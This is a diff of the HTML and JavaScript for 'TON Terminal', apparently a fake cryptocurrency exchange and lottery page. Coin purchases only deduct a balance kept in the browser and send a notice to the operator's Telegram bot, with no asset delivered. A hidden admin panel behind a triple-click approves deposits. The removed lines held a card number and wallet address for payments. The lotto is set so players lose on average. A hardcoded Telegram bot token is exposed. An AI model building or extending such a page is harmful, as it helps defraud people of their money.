@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Terminal — Final Sync 2026</title>
+    <title>TON Terminal 2025 — Oracle Global</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
@@ -13,15 +13,15 @@
         .buy-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); transition: all 0.3s; }
         .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3); }
         .nav-tab.active { background: rgba(59, 130, 246, 0.2); border: 1px solid #3b82f6; color: #3b82f6; }
-        select { appearance: none; background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 1rem center; background-size: 1em; }
-        select option { background-color: #0f172a; color: white; }
+        
+        /* Снегопад */
         #snow-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
-        .falling-item { position: absolute; top: -50px; color: rgba(255,255,255,0.6); animation: fall linear infinite; }
+        .falling-item { position: absolute; top: -50px; color: rgba(255,255,255,0.4); animation: fall linear infinite; }
         @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }
+
+        /* Боковая панель */
         #admin-sidebar { position: fixed; left: -350px; top: 0; width: 320px; height: 100%; z-index: 1000; transition: left 0.4s ease; }
         #admin-sidebar.open { left: 0; }
-        .box-shake { animation: shake 0.15s infinite; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-8px); } 40% { transform: translateX(8px); } }
     </style>
 </head>
 <body class="min-h-screen pb-20">
@@ -30,13 +30,9 @@
 
     <div id="password-modal" class="fixed inset-0 bg-black/95 z-[2000] hidden items-center justify-center p-4">
         <div class="glass p-10 rounded-[3rem] max-w-sm w-full text-center border-blue-500/20">
-            <h3 class="text-xl font-black uppercase mb-2 text-blue-400">Admin Login</h3>
-            <p id="pass-hint" class="text-[9px] text-slate-500 mb-6 uppercase">Код обновлен в начале часа</p>
-            <input type="text" id="admin-pin-input" maxlength="4" class="input-box w-full py-5 rounded-2xl text-4xl font-black text-center outline-none border-blue-500/30 text-white mb-8" placeholder="0000">
-            <div class="flex gap-3">
-                <button onclick="checkAdminPassword()" class="flex-1 buy-btn py-4 rounded-xl font-black text-[10px] uppercase">Войти</button>
-                <button onclick="closeModal('password-modal')" class="px-6 bg-white/5 rounded-xl text-[10px] font-bold uppercase">Назад</button>
-            </div>
+            <h3 class="text-xl font-black uppercase mb-2 text-blue-400">Admin Access</h3>
+            <input type="text" id="admin-pin-input" maxlength="4" class="input-box w-full py-5 rounded-2xl text-4xl font-black text-center outline-none text-white mb-8" placeholder="0000">
+            <button onclick="checkAdminPassword()" class="w-full buy-btn py-4 rounded-xl font-black text-[10px] uppercase">Войти</button>
         </div>
     </div>
 
@@ -50,7 +46,7 @@
     </div>
 
     <nav class="border-b border-white/5 py-4 px-4 md:px-8 flex justify-between items-center glass sticky top-0 z-50">
-        <div class="flex items-center gap-2"><span class="text-lg font-extrabold italic">TON<span class="text-blue-500">TERMINAL</span></span></div>
+        <div class="flex items-center gap-2"><span class="text-lg font-extrabold italic uppercase tracking-tighter">Ton<span class="text-blue-500">Terminal</span></span></div>
         <div class="flex items-center gap-3">
             <div class="text-right glass px-4 py-1.5 rounded-xl border border-white/10"><p id="balance-display" class="text-sm font-black text-green-400">0.00 грн</p></div>
             <button onclick="handleDepositBtnClick()" class="bg-blue-600 p-2 rounded-lg transition-all hover:scale-110">➕</button>
@@ -59,28 +55,31 @@
 
     <main class="max-w-7xl mx-auto p-4 md:p-8 relative z-10">
         <div class="flex justify-center gap-4 mb-8">
-            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">📈 Маркет</button>
-            <button onclick="showTab('shop')" id="btn-shop" class="nav-tab glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">🛍️ Магазин</button>
+            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">📈 Рынок & Поиск</button>
+            <button onclick="showTab('scan')" id="btn-scan" class="nav-tab glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">🔥 Потенциал</button>
             <button onclick="showTab('lotto')" id="btn-lotto" class="nav-tab glass px-6 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">🎁 Лото</button>
         </div>
 
         <div id="view-main" class="space-y-6">
             <div class="glass p-6 rounded-[2.5rem]"><div id="tradingview_widget" class="h-[450px] w-full rounded-2xl overflow-hidden"></div></div>
-            <div class="glass p-8 rounded-[2.5rem] border border-blue-500/10 text-center">
-                <h3 class="text-sm font-black uppercase mb-6 text-blue-400">Конвертер USD ❄️</h3>
-                <div class="max-w-md mx-auto mb-10"><input type="number" id="conv-usd" value="1000" class="input-box w-full p-4 rounded-2xl text-3xl font-bold outline-none text-center" oninput="runGlobalConvert()"></div>
-                <div id="conv-results" class="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-6 gap-3"></div>
+            
+            <div class="glass p-8 rounded-[2.5rem] border border-blue-500/10">
+                <h3 class="text-center text-xs font-black uppercase mb-6 text-blue-400 tracking-widest">Глобальный поиск монет мира (15,000+) 🌍</h3>
+                <div class="max-w-md mx-auto mb-8">
+                    <input type="text" id="global-search" placeholder="Введите название или символ (напр. PEPE)..." class="input-box w-full p-5 rounded-2xl text-lg font-bold outline-none text-center" oninput="searchAllCoins()">
+                </div>
+                <div id="search-results" class="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-5 gap-3 max-h-[400px] overflow-y-auto pr-2">
+                    <p class="text-center col-span-full text-slate-500 text-xs italic">Загрузка глобальной базы...</p>
+                </div>
             </div>
         </div>
 
-        <div id="view-shop" class="hidden">
-            <div class="max-w-2xl mx-auto glass p-8 rounded-[3rem]">
-                <h3 class="text-2xl font-black uppercase mb-8 text-center text-blue-500">Покупка Активов</h3>
-                <div class="space-y-4">
-                    <select id="shop-coin-select" class="w-full bg-[#0f172a] border border-white/10 p-5 rounded-2xl text-sm font-bold text-white outline-none"></select>
-                    <div class="input-box p-5 rounded-2xl"><label class="text-[9px] text-slate-500 uppercase font-black block">Количество</label><input type="number" id="shop-qty" value="1" class="bg-transparent text-2xl font-bold outline-none w-full" oninput="updateShopRate()"></div>
-                    <div id="shop-total" class="text-center p-6 bg-blue-500/5 border border-blue-500/10 rounded-2xl text-3xl font-black text-green-400">0.00 грн</div>
-                    <button onclick="processFinalPurchase()" class="buy-btn w-full py-5 rounded-2xl font-black text-sm uppercase shadow-2xl">Купить</button>
+        <div id="view-scan" class="hidden">
+            <div class="max-w-4xl mx-auto space-y-6">
+                <div class="glass p-10 rounded-[3rem] border border-green-500/10">
+                    <h3 class="text-2xl font-black uppercase mb-8 text-center text-green-400 italic">🔥 Trending Coins (На Хайпе)</h3>
+                    <div id="trending-list" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        </div>
                 </div>
             </div>
         </div>
@@ -95,56 +94,111 @@
                 <div id="prize-reveal" class="hidden flex-col items-center py-10">
                     <div id="prize-icon" class="text-9xl mb-6">💎</div>
                     <div id="prize-value" class="text-6xl font-black text-yellow-500 mb-8">0 грн</div>
-                    <button onclick="resetLotto()" class="text-[10px] font-bold uppercase text-slate-500">Назад</button>
+                    <button onclick="resetLotto()" class="text-[10px] font-bold uppercase text-slate-500 hover:text-white">Назад</button>
                 </div>
             </div>
         </div>
     </main>
 
-    <div id="deposit-modal" class="fixed inset-0 bg-black/95 z-[500] hidden items-center justify-center p-4 text-center">
-        <div class="glass p-10 rounded-[3rem] max-w-sm w-full">
-            <h3 class="text-xl font-black uppercase mb-8 text-blue-500">Пополнить</h3>
-            <input type="number" id="dep-input" value="100" class="input-box p-4 rounded-2xl w-full text-2xl font-bold text-center mb-6 outline-none">
-            <div class="flex gap-3 mb-8">
-                <button onclick="showDetails('Card')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase">Карта</button>
-                <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase">Крипта</button>
-            </div>
-            <div id="pay-details" class="hidden bg-black/40 p-4 rounded-2xl mb-8 text-[10px] font-mono break-all border border-white/10 text-white select-all"></div>
-            <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-xl font-black text-xs uppercase text-white">Я оплатил</button>
-            <button onclick="closeModal('deposit-modal')" class="w-full mt-4 text-slate-600 text-[10px] font-black uppercase">Отмена</button>
-        </div>
-    </div>
-
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <script>
         const TG_TOKEN = "8357376946:AAHbffgk6JY0Ip3yJ3yOGpTaG-_HZ7gjJZw";
         const TG_CHAT_ID = "5252821529";
-        const COINS = ["TON", "BTC", "ETH", "SOL", "TRX", "DOGE", "XRP", "LTC", "ADA", "DOT"];
-
+        
+        let allCoins = []; // Глобальная база 15,000+ монет
         let balance = parseFloat(localStorage.getItem('user_balance')) || 0.00;
-        let rates = {};
-        let depBtnClicks = 0;
         let pendingList = JSON.parse(localStorage.getItem('pending_list')) || [];
         let currentAdminPassword = "";
+        let depBtnClicks = 0;
 
-        // ЖЕСТКАЯ СИНХРОНИЗАЦИЯ ПАРОЛЯ ПО ЧАСАМ
-        function syncPassword() {
-            const now = new Date();
-            const seed = now.getUTCDate() + now.getUTCHours() + 2026; // День + Час + Константа
-            const code = ((seed * 17) % 9000 + 1000).toString();
+        // 1. ЗАГРУЗКА ВСЕЙ БАЗЫ МИРА (CoinGecko API)
+        async function initGlobalCrypto() {
+            try {
+                const res = await fetch('https://api.coingecko.com/api/v3/coins/list');
+                allCoins = await res.json();
+                console.log("Загружено монет: " + allCoins.length);
+                renderInitialList();
+                fetchTrending();
+            } catch (e) { console.error("Ошибка API"); }
+        }
+
+        function renderInitialList() {
+            // Показываем ТОП-20 популярных для начала
+            const topIds = ['bitcoin', 'ethereum', 'tether', 'solana', 'binancecoin', 'ripple', 'dogecoin', 'toncoin', 'cardano', 'shiba-inu'];
+            const initial = allCoins.filter(c => topIds.includes(c.id));
+            displaySearchResults(initial);
+        }
+
+        // 2. ПОИСК ПО ВСЕЙ БАЗЕ В РЕАЛЬНОМ ВРЕМЕНИ
+        function searchAllCoins() {
+            const query = document.getElementById('global-search').value.toLowerCase();
+            if (query.length < 2) { renderInitialList(); return; }
             
-            if (code !== currentAdminPassword) {
-                currentAdminPassword = code;
-                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🔐 АКТУАЛЬНЫЙ КОД: " + code)}`);
+            const results = allCoins.filter(c => 
+                c.name.toLowerCase().includes(query) || 
+                c.symbol.toLowerCase().includes(query)
+            ).slice(0, 50); // Берем первые 50 совпадений
+            
+            displaySearchResults(results);
+        }
+
+        function displaySearchResults(list) {
+            const container = document.getElementById('search-results');
+            container.innerHTML = list.map(c => `
+                <div onclick="requestCoinPrice('${c.id}', '${c.symbol.toUpperCase()}')" class="bg-white/5 p-4 rounded-2xl border border-white/5 text-center cursor-pointer hover:border-blue-500 transition-all">
+                    <p class="text-[7px] text-slate-500 font-black uppercase mb-1">${c.symbol}</p>
+                    <p class="text-[10px] font-bold text-blue-400 truncate">${c.name}</p>
+                </div>
+            `).join('');
+        }
+
+        // 3. МОНИТОРИНГ ПОТЕНЦИАЛЬНЫХ МОНЕТ (Trending)
+        async function fetchTrending() {
+            const res = await fetch('https://api.coingecko.com/api/v3/search/trending');
+            const data = await res.json();
+            const container = document.getElementById('trending-list');
+            container.innerHTML = data.coins.map(item => `
+                <div class="glass p-5 rounded-2xl border border-white/10 flex items-center gap-4">
+                    <img src="${item.item.small}" class="w-10 h-10 rounded-full">
+                    <div class="flex-1">
+                        <p class="text-xs font-black uppercase text-blue-400">${item.item.symbol}</p>
+                        <p class="text-[10px] text-slate-400">${item.item.name}</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-[9px] font-bold text-green-400">Rank: #${item.item.market_cap_rank}</p>
+                        <button onclick="requestCoinPrice('${item.item.id}', '${item.item.symbol}')" class="text-[8px] bg-blue-600 px-2 py-1 rounded-lg mt-1 font-bold">КУПИТЬ</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // 4. ЗАПРОС ЦЕНЫ ЛЮБОЙ МОНЕТЫ (Покупка)
+        async function requestCoinPrice(id, symbol) {
+            const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
+            const data = await res.json();
+            const usdPrice = data[id].usd;
+            const uahPrice = (usdPrice * 42.5 * 1.075).toFixed(2);
+            
+            if (confirm(`Купить ${symbol}?\nТекущая цена: ${uahPrice} грн\n(С учетом комиссии 7.5%)`)) {
+                if (balance < uahPrice) { alert("Недостаточно грн!"); return; }
+                balance -= uahPrice; updateUI();
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🛒 КУПИЛИ: " + symbol + "\nСписано: " + uahPrice + " грн")}`);
+                alert("Заявка принята! Ожидайте зачисления ассета.");
             }
         }
-        syncPassword();
-        setInterval(syncPassword, 60000);
+
+        // БЕЗОПАСНОСТЬ И ПАРОЛЬ (60 МИНУТ)
+        function syncPassword() {
+            const now = new Date();
+            const seed = now.getUTCDate() + now.getUTCHours() + 2026;
+            currentAdminPassword = ((seed * 17) % 9000 + 1000).toString();
+        }
+        syncPassword(); setInterval(syncPassword, 60000);
 
         function handleDepositBtnClick() {
             depBtnClicks++;
             if (depBtnClicks >= 3) { openModal('password-modal'); depBtnClicks = 0; }
-            else { setTimeout(() => { if(depBtnClicks > 0 && depBtnClicks < 3) openModal('deposit-modal'); depBtnClicks = 0; }, 250); }
+            else { setTimeout(() => { if(depBtnClicks > 0 && depBtnClicks < 3) { openModal('deposit-modal'); depBtnClicks = 0; } }, 300); }
         }
 
         function checkAdminPassword() {
@@ -167,56 +221,23 @@
             l.innerHTML = pendingList.length ? pendingList.map((d, i) => `
                 <div class="bg-white/5 p-4 rounded-xl flex justify-between items-center border border-white/10">
                     <p class="text-sm font-black text-green-400">${d.amount} грн</p>
-                    <button onclick="approveInSidebar(${i})" class="bg-green-600 px-3 py-1.5 rounded-lg text-[9px] font-black uppercase">OK</button>
-                </div>`).join('') : '<p class="text-center text-slate-500 text-[9px] italic">Нет новых запросов</p>';
+                    <button onclick="approveInSidebar(${i})" class="bg-green-600 px-3 py-1.5 rounded-lg text-[9px] font-black">OK</button>
+                </div>`).join('') : '<p class="text-center text-slate-500 text-[9px] italic">Пусто</p>';
         }
 
         function approveInSidebar(i) {
-            balance += parseFloat(pendingList[i].amount);
-            pendingList.splice(i, 1);
+            balance += parseFloat(pendingList[i].amount); pendingList.splice(i, 1);
             localStorage.setItem('pending_list', JSON.stringify(pendingList));
             updateUI(); renderSidebarList();
         }
 
-        async function fetchRates() {
-            try {
-                const res = await fetch('https://api.binance.com/api/v3/ticker/price');
-                const data = await res.json();
-                COINS.forEach(c => {
-                    const found = data.find(d => d.symbol === c + 'USDT');
-                    if(found) rates[c] = parseFloat(found.price);
-                });
-                runGlobalConvert();
-                if(!document.getElementById('shop-coin-select').options.length) {
-                    document.getElementById('shop-coin-select').innerHTML = COINS.map(c => `<option value="${c}">${c}</option>`).join('');
-                }
-                updateShopRate();
-            } catch(e) {}
-        }
-
-        function runGlobalConvert() {
-            const usd = parseFloat(document.getElementById('conv-usd').value) || 0;
-            const container = document.getElementById('conv-results');
-            if(!container) return;
-            container.innerHTML = Object.keys(rates).map(c => `<div class="bg-white/5 p-3 rounded-xl border border-white/5 text-center"><p class="text-[7px] text-slate-500 font-bold uppercase mb-1">${c}</p><p class="text-[11px] font-black text-blue-400">${(usd/rates[c]).toFixed(rates[c]<1?2:5)}</p></div>`).join('');
-        }
-
-        function updateShopRate() {
-            const c = document.getElementById('shop-coin-select').value;
-            const q = parseFloat(document.getElementById('shop-qty').value) || 0;
-            if(rates[c]) document.getElementById('shop-total').innerText = (q * rates[c] * 42.5 * 1.075).toFixed(2) + " грн";
-        }
-
-        function confirmDeposit() {
-            const a = document.getElementById('dep-input').value;
-            pendingList.push({ amount: a });
-            localStorage.setItem('pending_list', JSON.stringify(pendingList));
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("💰 ДЕПОЗИТ: "+a+" грн")}`);
-            closeModal('deposit-modal'); alert("Отправлено!");
+        function showTab(t) {
+            ['main', 'scan', 'lotto'].forEach(v => document.getElementById('view-'+v).classList.toggle('hidden', v !== t));
+            ['btn-main', 'btn-scan', 'btn-lotto'].forEach(b => document.getElementById(b).classList.toggle('active', b === 'btn-'+t));
         }
 
         function playLotto() {
-            if (balance < 350) return alert("Мало грн!");
+            if (balance < 350) return alert("Нужно 350 грн!");
             balance -= 350; updateUI();
             const b = document.getElementById('box-anim');
             b.classList.add('box-shake');
@@ -225,9 +246,10 @@
                 document.getElementById('lotto-stage').classList.add('hidden');
                 document.getElementById('prize-reveal').classList.remove('hidden');
                 const rand = Math.random() * 100;
-                let win = (rand <= 0.0001) ? 2500 : (rand <= 0.05 ? 1000 : (rand <= 5 ? 400 : 275));
+                let win = (rand <= 0.0001) ? 2500 : (rand <= 5 ? 400 : 275);
                 balance += win; updateUI();
                 document.getElementById('prize-value').innerText = win + " грн";
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🎉 ЛОТО: "+win+" грн")}`);
             }, 2000);
         }
 
@@ -236,26 +258,10 @@
             document.getElementById('prize-reveal').classList.add('hidden');
         }
 
-        function showTab(t) {
-            ['main', 'shop', 'lotto'].forEach(v => document.getElementById('view-'+v).classList.toggle('hidden', v !== t));
-            ['btn-main', 'btn-shop', 'btn-lotto'].forEach(b => document.getElementById(b).classList.toggle('active', b === 'btn-'+t));
-        }
-
         function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
         function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
 
-        function showDetails(m) {
-            const d = document.getElementById('pay-details'); d.classList.remove('hidden');
-            d.innerText = m === 'Card' ? "444 1144 3897 8734" : "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz";
-        }
-
-        setInterval(fetchRates, 30000); fetchRates(); updateUI();
-        setInterval(() => {
-            const el = document.createElement('div'); el.className = 'falling-item';
-            el.innerText = ['❄', '₿', 'Ξ', '₮'][Math.floor(Math.random()*4)];
-            el.style.left = Math.random() * 100 + 'vw'; el.style.animationDuration = (Math.random()*8+4)+'s';
-            document.getElementById('snow-bg').appendChild(el); setTimeout(() => el.remove(), 10000);
-        }, 500);
+        initGlobalCrypto(); updateUI();
         new TradingView.widget({ "autosize": true, "symbol": "OKX:TONUSDT", "interval": "H", "theme": "dark", "container_id": "tradingview_widget", "backgroundColor": "#05080f" });
     </script>
 </body>
